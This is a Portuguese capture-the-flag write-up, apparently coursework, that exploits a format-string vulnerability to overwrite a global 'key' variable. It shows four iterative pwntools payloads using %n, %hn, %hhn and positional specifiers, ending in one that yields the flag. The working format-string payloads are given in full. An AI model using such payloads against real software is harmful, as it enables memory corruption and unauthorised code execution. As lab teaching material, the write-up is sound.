# CTF7 Desafio extra

## Recolha de informação e Reconhecimento da vulnerabilidade

Acaba por ser bastante semelhante ao segundo desafio desta semana 7, apenas o endereço da variável `key` passa a ser `0x804b320`.


## Exploração da vulnerabilidade

### Tentativa 1

Começamos por tentar modificar o valor da variável global `key` usando o `%n`, tal como feito antes no desafio 2:

```py
p.recvuntil(b"here...")
p.sendline(b"AAAA\x20\xB3\x04\x08%.48871x%n")
p.interactive()
```

Mas correu mal, devido a `\x20` corresponder a um espaço em código ASCII, o que acaba por não permitir a leitura total da string injetada.

### Tentativa 2

Para tentar corrigir isso, fomos tentar escrever no endereço `0x804b31F` (1 byte anterior ao endereço da `key`) o valor de `0xBEEF00`:


```py
p.recvuntil(b"here...")
p.sendline(b"AAAA\x1F\xB3\x04\x08%.12513024x%n")
p.interactive()
```

Agora a shell já era lançada só que vinha logo com um timeout, por causa do elevado número de caracteres (mais de 12 milhões) escritos:

<img src="../screenshots/ctf7/try2.png" alt="try">

### Tentativa 3

Para corrigir tinhamos de baixar o número de caracteres escritos e para isso usamos os format specifiers `%hn` e `%hhn`, que nos permitem dividir o valor `0xBEEF00` em: **(1)** `0xBE` (1 byte, `%hhn`) e **(2)** `0xEF00` (2 bytes, `%hn`):

```py
p.recvuntil(b"here...")
p.sendline(b"AAAA\x21\xB3\x04\x08BBBB\x1F\xB3\x04\x08%.%172x%hhn%60994x%hn")
p.interactive()
```

No entanto ao executar voltamos a não conseguir lançar o terminar agora porque a string injetada ultrapassa os 32 bytes, o espaço alocado ao `buffer`...

### Tentativa 4

Então usamos os format specifiers `%1$hhn` e `%2$hn` para podermos poupar 8 bytes no nosso input - `%m$` permite-nos referenciar o m-ésimo argumento. 

```py
p.recvuntil(b"here...")
p.sendline(b"\x21\xB3\x04\x08\x1F\xB3\x04\x08%.182x%1$hhn%.60994x%2$hn")
p.interactive()
```

Só que como a string continua a ter mais de 32 bytes, passamos `%.182x` e `%.60994x` para `%182x` e `%60994x`, respetivamente:

```py
p.recvuntil(b"here...")
p.sendline(b"\x21\xB3\x04\x08\x1F\xB3\x04\x08%182x%1$hhn%60994x%2$hn")
p.interactive()
```

E assim já conseguimos obter a flag esperada:

<img src="../screenshots/ctf7/flag3.PNG" alt="flag3">
